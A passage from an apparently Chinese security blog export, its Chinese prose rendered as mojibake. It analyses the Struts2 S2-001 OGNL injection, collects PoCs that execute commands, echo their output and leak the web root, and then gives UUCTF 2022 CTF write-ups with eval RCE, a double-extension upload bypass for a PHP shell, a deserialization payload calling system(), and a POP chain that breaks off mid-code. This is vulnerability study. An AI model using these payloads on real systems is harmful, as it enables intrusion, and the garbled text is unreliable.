å…¥çš„æ•°æ®ï¼Œè¿™é‡Œæœ€åè‚¯å®šè¿”å›çš„æ˜¯errorå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹Struts.xmlå¯¹åº”çš„å¤„ç†åŠæ³• å¯ä»¥çœ‹åˆ°è½¬åˆ°index.jspè¿›è¡Œå¤„ç†ã€‚æˆ‘ä»¬çš„payloadæ˜¯ä»index.jspè¾“å…¥çš„ï¼Œè¿™é‡Œéœ€è¦äº†è§£çš„æ˜¯jspçš„æœ¬è´¨ä¹Ÿæ˜¯ä¸€ä¸ªServletï¼Œåœ¨æ‰§è¡Œjspçš„æ—¶å€™tomcatä¼šå°†å…¶è½¬åŒ–ä¸ºjavaä»£ç ï¼Œæ¯”å¦‚è¿™é‡Œindex.jspè¢«è½¬åŒ–ä¸ºindex_jsp.javaã€‚ è´Ÿè´£å¤„ç† JSP çš„ç±»æ˜¯ org.apache.struts2.views.jsp.ComponentTagSupportã€‚è§£æä¼šä»ç¬¬ä¸€ä¸ª Struts2 æ ‡ç­¾å³&lt;s:form action=\"Login\"&gt;å¼€å§‹ï¼Œå½“è§£æåˆ° ComponentTagSupport ç±»æ—¶ï¼Œé¦–å…ˆè¢«è°ƒç”¨çš„æ–¹æ³• å°±æ˜¯ doStartTag æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚é™¤ doStartTag æ–¹æ³•å¤–ï¼ŒComponentTagSupport ä¸­ è¿˜æœ‰ä¸€ä¸ª doEndTag æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è§£ææ ‡ç­¾å¼€å§‹æ—¶è°ƒç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯è§£æåˆ°æ ‡ç­¾é—­åˆæ—¶è°ƒç”¨ã€‚ è·¯å¾„ï¼š /org/apache/struts2/views/jsp/ComponentTagSupport.class ComponentTagSupport æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ã€‚ç”±äºé¦–å…ˆè¢«è§£æçš„æ˜¯ä¸€ä¸ª Struts2 Form æ ‡ç­¾ï¼Œ org.apache.struts2.views æœ‰ä¸€ä¸ªä¸ Formæ ‡ç­¾å¯¹åº”çš„å®ä½“ç±»ï¼Œç±»åä¸º FormTagï¼Œæ˜¯ ComponentTagSupport çš„å­ç±»ã€‚è™½ç„¶å½“å‰æ–­ç‚¹è®¾ç½®åœ¨ ComponentTagSupport çš„ doStartTag æ–¹æ³• ä¸Šï¼Œå…¶å®æ˜¯å­ç±»åœ¨è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œå› ä¸ºå½“å‰å¯¹è±¡æ˜¯ FormTag å¯¹è±¡ï¼š æ¥ä¸‹æ¥å°±æ˜¯é‡ç‚¹åˆ†æFormæ ‡ç­¾åé¢çš„&lt;s:textfieldæ ‡ç­¾ï¼Œè¿™ä¸¤ä¸ªæ ‡ç­¾çš„å…·ä½“å†™æ³•å¦‚å›¾ æ¥ä¸‹æ¥æˆ‘ä»¬åˆ«äº‹åè¯¸è‘›äº®ï¼Œå…ˆä»doStartTagå¼€å§‹åˆ†æ ä¸Šè¿°çš„componentè°ƒç”¨getBeanå‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºå€¼æ ˆå¯¹è±¡ã€httpè¯·æ±‚å¯¹è±¡ã€httpç›¸åº”å¯¹è±¡ï¼Œæœ€åä¼šè¿”å›ä¸€ä¸ªTextFieldå¯¹è±¡ï¼ˆè¿™é‡Œæš‚æ—¶æ²¡çœ‹å‡ºä»€ä¹ˆå¯ç–‘ç‚¹ï¼‰ ä¸‹é¢ä¸¤å¹…å›¾ç‰‡æ˜¯ï¼ŒgetBeanä¸­å…·ä½“çš„å®ç°ä»£ç ï¼Œä¹Ÿæ˜¯æ²¡æœ‰å¯ç–‘ç‚¹ this.populateParams();ä¼¼ä¹å°±æ˜¯å•çº¯çš„è®¾ç½®å±æ€§id éšåè°ƒç”¨startå‡½æ•°ï¼Œä¸è¿‡è¿™é‡Œæ’ä¸ºtrue æ¥ç€è¿›å…¥ifè¯­å¥ï¼Œè°ƒç”¨usesBodyï¼Œä¾æ—§æ’ä¸ºfalseï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªdoStartTagå§‹ç»ˆè¿”å›1 æ¥ç€åˆ†ædoEndTagï¼Œé¦–å…ˆè·Ÿè¿›å‡½æ•°endï¼Œè¿™é‡Œç»§ç»­è°ƒç”¨äº†evaluateParamsï¼Œç»§ç»­è·Ÿè¿› è¿™ä¸ªå‡½æ•°å‰åŠéƒ¨åˆ†é€»è¾‘æ¸…æ™°ï¼Œå°±æ˜¯æ·»åŠ ç›¸åº”çš„å‚æ•°ï¼ˆé”®ï¼šé”®å€¼ï¼‰ æ¥ç€åˆ†æä¸‹åŠéƒ¨åˆ†ï¼Œè¿™é‡Œå…ˆå±•ç¤ºäº†ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªè¿”å›æ’ä¸ºtrueï¼Œä¸€ä¸ªè¿”å›æ’ä¸ºString.classçš„ç±»å¯¹è±¡ æ ¹æ®ä¸Šé¢ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸€å®šä¼šè¿›å…¥ç¬¬äºŒä¸ªifè¯­å¥ï¼Œç”±äºvalueçš„å€¼ä¸ºnullï¼Œå› æ­¤è¿›å…¥elseè¯­å¥ï¼Œè¿™é‡Œçš„nameå°±æ˜¯æˆ‘ä»¬çš„usernameå­—ç¬¦ä¸² æ ¹æ®ä¸‹é¢ä¸¤ä¸ªå›¾ç‰‡ï¼Œæˆ‘ä»¬çŸ¥é“alSyntaxæ’ä¸ºtrue è¿™æ„å‘³ç€ï¼Œæœ€ç»ˆexprçš„å€¼ä¼šæ˜¯nameå€¼å‘¨å›´æ·»åŠ æŒ‡å®šç¬¦å·ï¼Œæ„æˆognlè¡¨è¾¾å¼ æ¥ç€å°±æ˜¯æ·»åŠ å±æ€§nameValueï¼Œè¿™å…¶ä¸­è°ƒç”¨äº†findValueæ¥å¯»æ‰¾nameä¹Ÿå°±æ˜¯usernameå­—ç¬¦ä¸²å¯¹åº”çš„å€¼ï¼Œè·Ÿè¿›å»çœ‹çœ‹ å¦‚ä¸Šå›¾ï¼Œæœ€ç»ˆæ˜¯ä¸€å®šä¼šè¿›å…¥translateVariablesæ–¹æ³•ï¼Œä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œ%ã€exprä»¥åŠå€¼æ ˆ è¿™é‡Œç»§ç»­è°ƒç”¨äº†é‡è½½å‡½æ•°ï¼Œæ— ä»–ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œæˆ‘è®¤ä¸ºå°±æ˜¯å…³é”®çš„ç‚¹äº†ï¼Œåˆ†æä¸€ä¸‹whileè¿™é‡Œæ‰§è¡Œé€»è¾‘ public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) { Object result = expression; while(true) { int start = expression.indexOf(open + \"{\"); int length = expression.length(); int x = start + 2; int count = 1; while(start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) { char c = expression.charAt(x++); if (c == '{') { ++count; } else if (c == '}') { --count; } } int end = x - 1; if (start == -1 || end == -1 || count != 0) { return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType); } String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) { o = evaluator.evaluate(o); } String left = expression.substring(0, start); String right = expression.substring(end + 1); if (o != null) { if (TextUtils.stringSet(left)) { result = left + o; } else { result = o; } if (TextUtils.stringSet(right)) { result = result + right; } expression = left + o + right; } else { result = left + right; expression = left + right; } } } charAt()å‡½æ•°æ˜¯ç”¨äºè·å–å­—ç¬¦ä¸²ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å­—ç¬¦çš„æ–¹æ³•ã€‚å®ƒå±äºStringç±»çš„æˆå‘˜æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡å­—ç¬¦ä¸²å¯¹è±¡è°ƒç”¨ã€‚ é¦–å…ˆå°±æ˜¯å®šä¹‰æŸäº›å‚æ•°ï¼Œè¿™é‡Œä»£ç èƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯ä¸çŸ¥é“å…·ä½“å«ä¹‰æ˜¯ä»€ä¹ˆï¼Œçœ‹äº†æ–‡ç« å‘ç°æ˜¯ç”¨æ¥åˆ¤æ–­{ä¸}ç¬¦å·æ•°é‡æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£countæœ€ç»ˆå°±æ˜¯0ï¼›ï¼ˆä¼°è®¡æ˜¯ä¸ºäº†ç¬¦åˆognlè¡¨è¾¾å¼è¦æ±‚ è¿™é‡Œæœ€ç»ˆä¼šç”±äºcount=0è·³å‡ºè¿™ä¸ªå¾ªç¯ï¼Œæ¥åˆ°ä¸‹å›¾ï¼Œè¿™é‡Œå°è¯•è¿”å›usernameå¯¹åº”çš„å€¼ï¼Œèµ‹å€¼ç»™å¯¹è±¡o è¿™é‡Œæˆ‘è¿˜æ²¡èµ‹å€¼ï¼Œæˆ‘ä»¬å‡è®¾è¿™é‡Œusernameå€¼ä¸º%{1+1}ï¼Œé‚£oçš„å€¼å°±ä¸æ˜¯nullï¼Œç„¶åè¿™é‡Œçš„stringSetï¼Œç”±äºstringè‚¯å®šä¸ºnullï¼ˆä¹Ÿå°±æ˜¯leftï¼‰ï¼Œæœ€ç»ˆçš„å°±ä¼šé€ æˆexpression=%{1+1} æ¥ç€æŒ‰ç…§ä¸Šå›¾ï¼Œè·Ÿè¿›OgnlUtil.getValueï¼Œæ­¤æ—¶å‘ç°è¿›å…¥åˆ°Ognl.classçš„getValueï¼Œä¹Ÿå°±æ˜¯å¤„ç†Ognlè¡¨è¾¾å¼çš„ç±» è¿™é‡Œåˆ©ç”¨treeå‚æ•°ï¼ˆè¢«å¼ºè½¬ä¸ºtreeï¼‰ä¹‹åè°ƒç”¨getValueæ–¹æ³• ä¹‹åæ¥åˆ°ifè¯­å¥ï¼Œç”±äºgetTraceEvaluationsæ’ä¸ºfalseï¼Œäºæ˜¯ç›´æ¥æ‰§è¡Œæœ€ä¸‹é¢çš„evaluateGetValueBody å¦‚ä¸‹å›¾ï¼Œå…ˆæ˜¯è®¾ç½®ä¸Šä¸‹æ–‡çš„å½“å‰å¯¹è±¡ä»¥åŠå½“å‰èŠ‚ç‚¹ï¼Œæœ€ç»ˆä¼šè°ƒç”¨getValueBdoyæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿› æ¥ç€å°±æ˜¯ognlè¡¨è¾¾å¼çš„åº•å±‚é€»è¾‘äº†ï¼Œè¿™é‡Œå…ˆä¸åˆ†æognlè¡¨è¾¾å¼æ¼æ´ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“åœ¨getValueBdoyæ–¹æ³•ä¸­ï¼Œå…ˆæ˜¯å–å‡ºognlè¡¨è¾¾å¼ï¼Œè¿™é‡Œå°±æ˜¯%{1+1}å¾—åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™é‡Œæ˜¾ç¤ºresult=1ï¼Œæ¥ç€è¿›å…¥forå¾ªç¯ï¼Œç»§ç»­éå†ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼Œéšåå†å–å‡ºæ¥å°†å¾—åˆ°çš„ç»“æœï¼Œè°ƒç”¨addå‡½æ•°ï¼ˆé€»è¾‘ä¼¼ä¹å°±æ˜¯ç›¸åŠ ï¼‰ï¼Œç›¸åŠ å¾—åˆ°result=2ï¼Œä¹Ÿå°±æ˜¯ognlè¡¨è¾¾å¼çš„è§£ææ‰§è¡Œ è‡³æ­¤struts2-001æ¼æ´åˆ†æä¹Ÿå°±ç»“æŸäº† é—®é¢˜äºŒ è™½ç„¶åˆ†æäº†ä¸Šè¿°struts2-001æ¼æ´ï¼Œä½†å…¶å®ä¹ŸçŸ¥é“ï¼Œæ ¹æœ¬ä¸Šè¿˜æ˜¯å› ä¸ºognlè¡¨è¾¾å¼çš„æ³¨å…¥æ¼æ´ï¼Œå› æ­¤æˆ‘è®¤ä¸ºè¿˜éœ€è¦å…·ä½“åˆ†æä¸€ä¸‹ognlè¡¨è¾¾å¼ã€‚ å€ŸåŠ©ä¸€ä¸ªdemoï¼Œä¸‹æ–­ç‚¹è·Ÿè¿›getValue å¾€ä¸‹è°ƒè¯•ï¼Œçœ‹åˆ°è°ƒç”¨äº†parseExpression()å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ä¼ å…¥çš„Stringç±»å‹çš„å­—ç¬¦ä¸²è§£æä¸ºOGNLè¡¨è¾¾å¼èƒ½ç†è§£çš„ASTChainç±»å‹ï¼š åˆ°è¾¾ä¸‹å›¾ï¼Œå‘ç°treeå‚æ•°ï¼ˆè¢«å¼ºè½¬ä¸ºNodeï¼‰è°ƒç”¨äº†getValueï¼Œä¼ å…¥çš„å‚æ•°ä¸ºå½“å‰ognlä¸Šä¸‹æ–‡ä»¥åŠrootæ ¹å¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿› å‘ç°è°ƒç”¨äº†evaluateGetValueBodyï¼Œç»§ç»­è·Ÿè¿› è¿™é‡Œè·Ÿè¿›åˆ°äº†getValueBodyæ–¹æ³•ï¼Œè¿™é‡Œçœ‹é€»è¾‘æ˜¯å¯¹å½“å‰å¯¹è±¡æ‰€æ‹¥æœ‰çš„èŠ‚ç‚¹è¿›è¡Œçš„å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›å‘ç°åˆ°äº†å¦‚ä¸‹å›¾æ‰€ç¤ºçš„åœ°æ–¹ï¼Œå¯¹å½“å‰æ ¹èŠ‚ç‚¹è°ƒç”¨getValue è·Ÿè¿›ä¹‹åï¼Œåˆæ¥åˆ°getValueBodyï¼ˆé‡è½½æ–¹æ³•ï¼‰ï¼Œè·Ÿè¿›å‘ç°è°ƒç”¨äº†callStaticMethod å¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†classForNameè·å¾—å½“å‰classNameçš„classå¯¹è±¡ä¹Ÿå°±æ˜¯java.lang.Runtimeçš„ç±»å¯¹è±¡ ç»§ç»­è·Ÿè¿›è°ƒç”¨callStaticMethodé‡è½½å‡½æ•°ï¼Œè°ƒç”¨äº†getMethodsæ¥è·å–å½“å‰java.lang.Runtimeç±»å¯¹è±¡çš„getRuntimeæ–¹æ³• ç»§ç»­è·Ÿè¿›ï¼Œè°ƒç”¨äº†invokeMethod æœ€ç»ˆæ˜¯è°ƒç”¨äº†invokeæ–¹æ³•ï¼Œæ‰§è¡ŒgetRuntimeå‡½æ•°æ¥å®ä¾‹åŒ–Runtimeç±» è‡³æ­¤ç¬¬ä¸€éƒ¨åˆ†èŠ‚ç‚¹åˆ†æå®Œæˆï¼Œæ¥ä¸‹æ¥åˆ†æexecæ–¹æ³•æ˜¯å¦‚ä½•ä¼ å…¥è¿›å»çš„ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªèŠ‚ç‚¹ åˆ†æè·¯å¾„åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯è°ƒç”¨çš„ç›¸å…³é‡è½½å‡½æ•°ä¸ä¸€è‡´ æŒ‰ç…§èŠ‚ç‚¹ä¸€çš„æ€è·¯æŒç»­è·Ÿè¿›ï¼Œæœ€ç»ˆæ¥åˆ°è¿™é‡Œå‘ç°è°ƒç”¨callMethodæ–¹æ³• è¿›ä¸€æ­¥è°ƒç”¨getMethods æ— è„‘è·Ÿè¿›ï¼Œæœ€ç»ˆçœ‹åˆ°å†æ¬¡è°ƒç”¨method.invokeï¼Œæ‰§è¡Œäº†Runtimeå®ä¾‹çš„execæ–¹æ³•ï¼Œå¹¶ä¼ å…¥äº†calcå‚æ•°ï¼Œå¼¹å‡ºè®¡ç®—å™¨ è‡³æ­¤ï¼Œæœ€ç»ˆå‡½æ•°è°ƒç”¨æ ˆå¦‚ä¸‹ invokeMethod:491, OgnlRuntime (ognl) callAppropriateMethod:785, OgnlRuntime (ognl) callStaticMethod:48, ObjectMethodAccessor (ognl) callStaticMethod:806, OgnlRuntime (ognl) getValueBody:67, ASTStaticMethod (ognl) evaluateGetValueBody:170, SimpleNode (ognl) getValue:210, SimpleNode (ognl) getValueBody:109, ASTChain (ognl) evaluateGetValueBody:170, SimpleNode (ognl) getValue:210, SimpleNode (ognl) getValue:333, Ognl (ognl) getValue:378, Ognl (ognl) getValue:357, Ognl (ognl) main:13, Test (org.example) ç®€å•åœ°è¯´ï¼ŒOGNLè¡¨è¾¾å¼çš„getValue()è§£æè¿‡ç¨‹å°±æ˜¯å…ˆå°†æ•´ä¸ªOGNLè¡¨è¾¾å¼æŒ‰ç…§è¯­æ³•æ ‘åˆ†ä¸ºå‡ ä¸ªå­èŠ‚ç‚¹æ ‘ï¼Œç„¶åå¾ªç¯éå†è§£æå„ä¸ªå­èŠ‚ç‚¹æ ‘ä¸Šçš„OGNLè¡¨è¾¾å¼ï¼Œå…¶ä¸­é€šè¿‡Method.invoke()å³åå°„çš„æ–¹å¼å®ç°ä»»æ„ç±»æ–¹æ³•è°ƒç”¨ï¼Œå°†å„ä¸ªèŠ‚ç‚¹è§£æè·å–åˆ°çš„ç±»æ–¹æ³•é€šè¿‡ASTChainé“¾çš„æ–¹å¼ä¸²è¿èµ·æ¥å®ç°å®Œæ•´çš„è¡¨è¾¾å¼è§£æã€å¾—åˆ°å®Œæ•´çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚ 0x05 æ¼æ´ä¿®å¤ è¿™é‡Œåœ¨åˆ†æä¿®å¤å‰åçš„ä»£ç åˆé‡åˆ°äº†å°å°é—®é¢˜ï¼Œå‘ç°å¯¹æ¼æ´äº§ç”Ÿè¿˜æ˜¯æœ‰ç‚¹ä¸æ¸…æ¥šï¼Œä½†ç»§ç»­é‡æ–°è°ƒè¯•ç»ˆäºæ˜ç™½ é™„ä¸Šä¿®å¤å’Œä¿®å¤å‰çš„ä»£ç ï¼ˆå€Ÿä¸ªå›¾ï¼‰ å¯ä»¥çœ‹åˆ°ä¸Šè¿°å¢åŠ äº†ä¸€ä¸ªifåˆ¤æ–­ï¼Œæ ¹æ®æ–‡ç« æ‰€è¯´ï¼Œè¿™é‡Œæ˜¯ Ognl é€’å½’è§£ææ¬¡æ•°çš„åˆ¤æ–­ï¼Œé»˜è®¤æƒ…å†µä¸‹ä»…è§£æç¬¬ä¸€å±‚ã€‚ å¯¹äºè¿™ç§ä¿®å¤è§£é‡Šï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æ¼æ´æ‰§è¡Œé€»è¾‘ï¼Œé¦–å…ˆæ˜¯è§£ææ‰§è¡Œ%{username}ï¼Œæ˜¯ä¸€ä¸ªognlè¡¨è¾¾å¼ï¼Œä¼šè¿›è¡Œognlè¡¨è¾¾å¼è§£ææ‰§è¡Œï¼Œæœ€ç»ˆå°±æ˜¯æ¥è·å–usernameçš„å€¼ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆæˆä¸º%{1+1}ï¼Œå› ä¸ºæˆ‘ä»¬è®¾ç½®çš„usernameå°±æ˜¯%{1+1}ï¼Œç”±äºä¿®å¤å‰çš„ä»£ç ç”¨çš„æ˜¯whileå¾ªç¯ï¼Œå› æ­¤åˆä¼šå»é€’å½’è§£æè¿™ä¸ª%{1+1}ï¼Œåˆè®¤ä¸ºæ˜¯ognlè¡¨è¾¾å¼ï¼Œæœ€ç»ˆè§£æä¸º2ã€‚ ä½†ä¿®å¤åçš„è¿›è¡Œäº†åˆ¤æ–­ï¼šé€’å½’è§£ææ¬¡æ•°ã€‚å› æ­¤å¦‚æœè¿˜æ˜¯ä¸Šè¿°æƒ…å†µï¼Œä¼šåœ¨è§£æ%{1+1}çš„æ—¶å€™ï¼Œåˆ¤æ–­æ¬¡æ•°ä¸Šé™ï¼Œé€€å‡ºwhileå¾ªç¯ï¼Œä¹Ÿå°±ä¸ä¼šè¢«æ‰§è¡Œäº†ã€‚ æ€»ç»“ ç»è¿‡ä¸Šè¿°æ¼æ´çš„åˆ†æï¼Œå¯ä»¥çœ‹åˆ°Struts2-001æ¼æ´ç‚¹ï¼Œå°±åœ¨äºå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰åšå‡ºåˆç†åˆ¤æ–­ï¼Œå¯¼è‡´åœ¨è§£æognlè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œåœ¨å…¶ä¸­çš„whileå¾ªç¯ï¼Œé€’å½’è§£æäº†ognlè¡¨è¾¾å¼ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ 0x06 Pocé‡‡é›† å›æ˜¾poc %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"pwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} è°ƒè¯•pocï¼š %{(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc.exe\"})).start()} è·å–webè·¯å¾„ %{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() } 0x07 å‚è€ƒæ–‡ç«  Javaå®‰å…¨ä¹‹S2-001æ¼æ´åˆ†æ OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“ Java Webå®‰å…¨å…¥é—¨â€”â€”S2-001æ¼æ´åˆ†æ Struts2-001æ¼æ´åˆ†æï¼ˆCVE-2007-4556ï¼‰â€“ç¯å¢ƒæ­å»ºå¯å‚è€ƒ OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“ https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Javaä»£ç å®¡è®¡ä¹‹Struts2-001.md JavaWebå®‰å…¨å…¥é—¨ä¹‹ S2-001æ¼æ´åˆ†æ","tags":["Javaååºåˆ—åŒ–"],"categories":["Javaååºåˆ—åŒ–"]},{"title":"UUCTF_2022","path":"/2024/04/15/uuctf-2022/","content":"[UUCTF 2022 æ–°ç”Ÿèµ›]websign æºç æ‰¾åˆ° [UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce ä¸»è¦è¿˜æ˜¯å¯¹evalæœ‰ä¸ªç†è§£ï¼šå°±æ˜¯å°†æ‹¬å·å†…çš„å­—ç¬¦ä¸²å½“PHPä»£ç æ‰§è¡Œï¼Œå¹¶ä¸”è¿™é‡Œéœ€è¦å€ŸåŠ©print_rå‡½æ•°æ‰“å°ç»“æœ ?code=print_r(`ta\\c /fffffffffflagafag`); [UUCTF 2022 æ–°ç”Ÿèµ›]ez_upload fuzzäº†ä¸€æ³¢ï¼Œè¿‡æ»¤äº†phpã€.htaccessã€.user.iniåç¼€ï¼Œå°è¯•äº†ç•¸å½¢åç¼€æ²¡æœ‰ç”¨ï¼Œç„¶åè€ƒè™‘ä¸­é—´ä»¶è§£ææ¼æ´ ä½†æ˜¯å°è¯•äº†ä¸€æ³¢ndayæ— æœï¼Œçœ‹äº†wpå‘ç°è·Ÿæˆ‘ç†è§£çš„è§£ææ¼æ´ä¸ä¸€è‡´ï¼šhttps://www.cnblogs.com/bkofyZ/p/17629763.html è¯´æ˜¯ Apacheè§£ææ¼æ´ï¼šå› ä¸ºApacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªç”¨.åˆ†å‰²å¾—åç¼€ï¼Œå½“æœ€å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼ˆmime.typesæ–‡ä»¶ä¸­çš„ä¸ºåˆæ³•åç¼€ï¼‰åˆ™ç»§ç»­å‘å·¦çœ‹ï¼Œç›´åˆ°ç¢°åˆ°åˆæ³•åç¼€æ‰è¿›è¡Œè§£æï¼ˆä»¥æœ€åä¸€ä¸ªåˆæ³•åç¼€ä¸ºå‡†ï¼‰,å¯ç”¨æ¥ç»•è¿‡é»‘åå•è¿‡æ»¤ã€‚ è¿™ä¸ªæ˜¯æˆ‘ä»¬å¸¸è§çš„è¯´æ³•ï¼Œä½†è¿™é‡Œæå¾—æ˜¯shell.xxx.phpï¼ŒæŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯shell.php.hybcxï¼Œåº”è¯¥æ˜¯æœ€å³ä¾§è¯†åˆ«ä¸äº†ï¼Œæ‰è¯†åˆ«å·¦ä¾§ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸æ¸…æ¥šè¿™ç®—å“ªç§è§£ææ¼æ´ ä¹‹åèšå‰‘è¿æ¥çœ‹ä¸€ä¸‹æºç  &lt;?php //echo $_FILES['file']['name'];echo '&lt;br&gt;'; //echo $_FILES['file']['type'];echo '&lt;br&gt;'; $flag1=true; $flag2=true; $file_name=$_FILES['file']['name']; $file_type=$_FILES['file']['type']; $allow_file_type=['image/jpeg','image/png']; $allowedExts = array(\"php\", \"php3\", \"php5\", \"phtml\",\"htaccess\"); $ext=substr($file_name,strpos($file_name,\".\")+1); if(!in_array(strtolower($file_type),$allow_file_type)){ $flag1=false; die(\"ä½ å¥½åå“¦ï¼Œä¸ç†ä½ äº†\"); } if(in_array(strtolower($ext),$allowedExts)){ $flag2=false; die(\"ä½ å¥½åå“¦ï¼Œä¸ç†ä½ äº†\"); } if($flag1&amp;&amp;$flag2){ if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" æ–‡ä»¶å·²ç»å­˜åœ¨ã€‚ \"; } else { // å¦‚æœ upload ç›®å½•ä¸å­˜åœ¨è¯¥æ–‡ä»¶åˆ™å°†æ–‡ä»¶ä¸Šä¼ åˆ° upload ç›®å½•ä¸‹ move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"æ–‡ä»¶å­˜å‚¨åœ¨: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } } else{ echo \"Hackerï¼Œä½ å¥½åå“Ÿ\"; } å‘ç°ä»–å¯¹äºåç¼€çš„åˆ¤æ–­ï¼Œåªæ˜¯åŸºäºç¬¬ä¸€ä¸ªç‚¹å·ä¹‹åçš„å­—ç¬¦è¿›è¡Œæ£€æŸ¥ï¼Œå¯¹äºæˆ‘ä»¬çš„shell.xxx.phpï¼Œç»è¿‡æˆªå–ä¹‹åå°±æ˜¯xxx.phpï¼Œé‚£è‚¯å®šä¸åœ¨è¿‡æ»¤åå•ä¸­ï¼Œåˆç”±äºåç¼€æ˜¯phpï¼Œç»è¿‡apacheè§£æå°±ä»¥phpæ–‡ä»¶æ‰§è¡Œäº†ã€‚ å¾ˆæ˜¾ç„¶è¿™åªæ˜¯ä¸šåŠ¡é€»è¾‘é—®é¢˜ï¼Œä¸apacheè§£ææ¼æ´ä¹Ÿè°ˆä¸ä¸Šã€‚ å‚è€ƒæ–‡ç«  [UUCTF 2022 æ–°ç”Ÿèµ›]ez_upload [UUCTF 2022 æ–°ç”Ÿèµ›]ez_unser &lt;?php show_source(__FILE__); ###very___so___easy!!!! class test{ public $a; public $b; public $c; public function __construct(){ $this-&gt;a=1; $this-&gt;b=2; $this-&gt;c=3; } public function __wakeup(){ $this-&gt;a=''; } public function __destruct(){ $this-&gt;b=$this-&gt;c; eval($this-&gt;a); } } $a=$_GET['a']; if(!preg_match('/test\":3/i',$a)){ die(\"ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼\"); } $bbb=unserialize($_GET['a']); ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼ ç®€å•çš„ååºåˆ—åŒ–ï¼Œè™½ç„¶è¿™é‡Œä¸èƒ½ç»•è¿‡wakeupï¼Œä½†æ˜¯å¯ä»¥é…åˆå¼•ç”¨æ¥ç»•è¿‡ &lt;?php class test{ public $a; public $b; public $c; public function __construct(){ $this-&gt;a=\"system('ls /')\"; $this-&gt;b=&amp;$this-&gt;a; $this-&gt;c=\"system('ls /')\"; } } $pop=new test(); echo serialize($pop); ?&gt; è¯»å–å³å¯ [UUCTF 2022 æ–°ç”Ÿèµ›]ezsql ç®€å•sqlæ³¨å…¥ï¼Œåªè¿‡æ»¤äº†orï¼ŒåŒå†™å³å¯ï¼Œå‰©ä¸‹å°±æ˜¯åè½¬ä¸€ä¸‹å­—ç¬¦ä¸²å³å¯ [UUCTF 2022 æ–°ç”Ÿèµ›]ezpop &lt;?php //flag in flag.php error_reporting(0); class UUCTF{ public $name,$key,$basedata,$ob; function __construct($str){ $this-&gt;name=$str; } function __wakeup(){ if($this-&gt;key===\"UUCTF\"){ $this-&gt;ob=unserialize(base64_decode($this-&gt;basedata)); } else{ die(\"oh!you should learn PHP unserialize String escape!\"); } } } class output{ public $a; function __toString(){ $this-&gt;a-&gt;rce(); } } class nothing{ public $a; public $b; public $t; function __wakeup(){ $this-&gt;a=\"\"; } function __destruct(){ $this-&gt;b=$this-&gt;t; die($this-&gt;a); } } class youwant{ public $cmd; function rce(){ eval($this-&gt;cmd); } } $pdata=$_POST[\"data\"]; if(isset($pdata)) { $data=serialize(new UUCTF($pdata)); 